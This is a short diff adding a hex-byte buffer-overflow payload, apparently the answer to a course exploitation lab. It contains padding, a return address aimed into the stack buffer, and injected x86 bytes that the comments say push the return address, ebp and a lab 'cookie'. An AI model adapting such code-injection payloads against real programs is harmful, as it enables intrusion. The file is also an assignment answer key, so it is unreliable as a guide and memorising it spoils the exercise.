@@ -1,0 +1,16 @@
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+aa aa aa aa 
+bb bb bb bb 
+cc cc cc cc 
+dd dd dd dd 
+48 3c 68 55 /* filler up till here, this is adress for buffer to return to next line */
+68 81 8e 04 /* begining of assemly to push literals of return, ebp, and cookie */
+08 b8 54 ce 
+6a 4c bd 70 
+3c 68 55 c3
